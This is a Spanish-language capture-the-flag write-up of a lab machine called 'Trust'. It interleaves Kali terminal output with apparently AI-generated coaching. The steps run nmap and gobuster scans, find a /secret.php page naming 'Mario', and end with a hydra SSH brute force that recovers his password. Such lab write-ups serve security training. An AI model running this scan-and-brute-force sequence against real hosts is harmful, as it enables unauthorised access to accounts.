# Máquina Trust

**IP**: 172.17.0.2

## Fase de Reconocimiento

### 1. Ping
- La máquina responde correctamente:
┌──(pol㉿kali)-[~]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.133 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.080 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.082 ms
64 bytes from 172.17.0.2: icmp_seq=4 ttl=64 time=0.069 ms
^C
--- 172.17.0.2 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3061ms
rtt min/avg/max/mdev = 0.069/0.091/0.133/0.024 ms

###   Fase 1: Reconocimiento
1. Escaneo básico con Nmap
Vamos a identificar los puertos abiertos en la máquina.

Ejecuta:

bash
Copy
nmap 172.17.0.2                                                

┌──(pol㉿kali)-[~]
└─$ nmap 172.17.0.2  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-06 18:50 -03
Nmap scan report for 172.17.0.2
Host is up (0.000025s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds

1. Escaneo avanzado con Nmap
Vamos a obtener más detalles sobre los servicios y el sistema operativo.

Ejecuta:

bash
Copy
nmap -sV -O 172.17.0.2

┌──(pol㉿kali)-[~]
└─$ nmap -sV -O 172.17.0.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-06 18:52 -03
Nmap scan report for 172.17.0.2
Host is up (0.000089s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
MAC Address: 02:42:AC:11:00:02 (Unknown)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.71 seconds

### ¡Perfecto! El escaneo avanzado con Nmap nos ha dado información muy útil sobre la máquina 172.17.0.2. Vamos a analizar los resultados y continuar paso a paso.

Resultados del escaneo avanzado
Servicios y versiones:

Puerto 22/tcp:

Servicio: SSH

Versión: OpenSSH 9.2p1 Debian 2+deb12u2 (protocolo 2.0).

Puerto 80/tcp:

Servicio: HTTP

Versión: Apache httpd 2.4.57 (Debian).

Sistema operativo:

Sistema operativo: Linux (kernel 4.x o 5.x).

Detalles: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4).

Distancia de red:

La máquina está a 1 hop de distancia (es decir, está en la misma red local).

Fase 2: Análisis de servicios
1. Servicio SSH (puerto 22)
OpenSSH 9.2p1 es una versión relativamente reciente y segura. Es poco probable que tenga vulnerabilidades explotables directamente.

Sin embargo, podemos intentar un ataque de fuerza bruta si encontramos un nombre de usuario válido (por ejemplo, admin, root, user).

2. Servicio HTTP (puerto 80)
Apache 2.4.57 es una versión reciente, pero siempre es recomendable buscar vulnerabilidades específicas.

Vamos a investigar el servidor web para ver si hay directorios ocultos, archivos sensibles o aplicaciones web vulnerables.

Próximos pasos
Investigar el servidor web (puerto 80):

Usaremos curl o un navegador para ver qué hay en la página principal.

Luego, escanearemos directorios con una herramienta como gobuster para encontrar rutas ocultas.

Buscar vulnerabilidades en los servicios:

Revisaremos si hay exploits públicos para las versiones de Apache y OpenSSH.

Paso 1: Investigar el servidor web
1. Acceder a la página principal
Ejecuta:

bash
curl http://172.17.0.2


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Apache2 Debian Default Page: It works</title>
    <style type="text/css" media="screen">
  * {
    margin: 0px 0px 0px 0px;
    padding: 0px 0px 0px 0px;
  }
.....

### markdown
Copy
### 4. Análisis del servicio HTTP
- Accedí al servidor web en el puerto 80.
- La página muestra: [Aquí pega el contenido que obtengas].
2. Escaneo de directorios con Gobuster
Ejecuta:

bash
Copy
gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt .php, .txt, .py, 

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/server-status        (Status: 403) [Size: 275]
Progress: 220559 / 220560 (100.00%)
===============================================================
Finished
===============================================================
### ¡Gracias por compartir los resultados! Gobuster ha encontrado un directorio interesante:

/server-status: Este directorio devuelve un código de estado 403 (Prohibido), lo que significa que no tenemos acceso a él. Esto es común en servidores Apache, ya que /server-status suele estar restringido por razones de seguridad.

Análisis de los resultados
/server-status:

Este directorio es utilizado por Apache para mostrar el estado del servidor (por ejemplo, solicitudes activas, estadísticas, etc.).

El código 403 indica que el acceso está prohibido, lo cual es una configuración típica para evitar que usuarios no autorizados vean información sensible.

No se encontraron otros directorios:

Gobuster no encontró otros directorios o rutas accesibles en el servidor web. Esto sugiere que el servidor puede estar configurado de manera minimalista o que los directorios están ocultos detrás de nombres no comunes.

Próximos pasos
Investigar la página principal:

Aunque no se encontraron directorios adicionales, es importante revisar la página principal del servidor web (http://172.17.0.2) para ver si hay pistas o información útil.

Usa curl o abre la página en un navegador:

bash
Copy
curl http://172.17.0.2
Revisar el código fuente:

Si hay una página web, revisa su código fuente en busca de comentarios, enlaces ocultos o credenciales.

Buscar subdominios o virtual hosts:

A veces, los servidores web tienen múltiples sitios alojados en el mismo IP. Podemos intentar descubrir subdominios o virtual hosts.

Investigar el servicio SSH:

Dado que el servidor web no ha revelado mucha información, podemos enfocarnos en el servicio SSH (puerto 22) para intentar acceder al sistema.

Pregunta:
¿Quieres que continuemos con la investigación de la página principal usando curl, o prefieres explorar otra área (como SSH o subdominios)?

¡Espero tu respuesta para seguir avanzando! 😊
#
Buena idea! Agregar extensiones como .php, .txt, y .py al escaneo de Gobuster puede ayudarnos a descubrir archivos específicos que no aparecen en un escaneo de directorios estándar. Vamos a ejecutar Gobuster con esas extensiones y ver si encontramos algo interesante.

Paso 1: Ejecutar Gobuster con extensiones
Ejecuta el siguiente comando:

bash
Copy

gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt,.py

Explicación de los parámetros:
-u http://172.17.0.2: Especifica la URL objetivo.

-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt: Usa la lista de palabras de Seclists.

-x .php,.txt,.py: Busca archivos con estas extensiones.

Paso 2: Analizar los resultados
Una vez que Gobuster termine, revisaremos los resultados. Por ejemplo, si encuentra algo como:

Copy
/index.php            (Status: 200) [Size: 1234]
/secret.txt           (Status: 200) [Size: 567]
/admin.php            (Status: 301) [Size: 0]
Podemos investigar esos archivos para ver si contienen información útil.

Pregunta:
¿Quieres que ejecute el comando de Gobuster con las extensiones y te muestre los resultados, o prefieres hacerlo tú mismo y luego continuamos con el análisis?

¡Espero tu respuesta! 😊


┌──(pol㉿kali)-[/usr/share/seclists]
└─$ gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt,.py
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,py
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/secret.php           (Status: 200) [Size: 927]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
Progress: 882236 / 882240 (100.00%)
===============================================================
Finished
===============================================================

### ¡Excelente! Gobuster ha encontrado un archivo interesante: /secret.php con un código de estado 200 (OK), lo que significa que es accesible. Vamos a investigar este archivo para ver si contiene información útil.

Análisis de los resultados
/secret.php:

Este archivo podría contener información sensible, como credenciales, mensajes ocultos o incluso una puerta trasera.

Vamos a acceder a él usando curl o un navegador.

Otros resultados:

/.php y /server-status devuelven un código 403 (Prohibido), lo que significa que no tenemos acceso a ellos.

Paso 1: Investigar /secret.php
1. Acceder al archivo /secret.php
Ejecuta:

bash
Copy
curl http://172.17.0.2/secret.php

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>¡Secreto!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            text-align: center;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            color: #333;
        }
        p {
            color: #666;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Hola Mario,</h1>
        <p>Esta web no se puede hackear.</p>
    </div>
</body>
</html>

### Próximos pasos
┌──(pol㉿kali)-[/usr/share/seclists]
└─$ hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-06 19:38:14
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-06 19:38:24



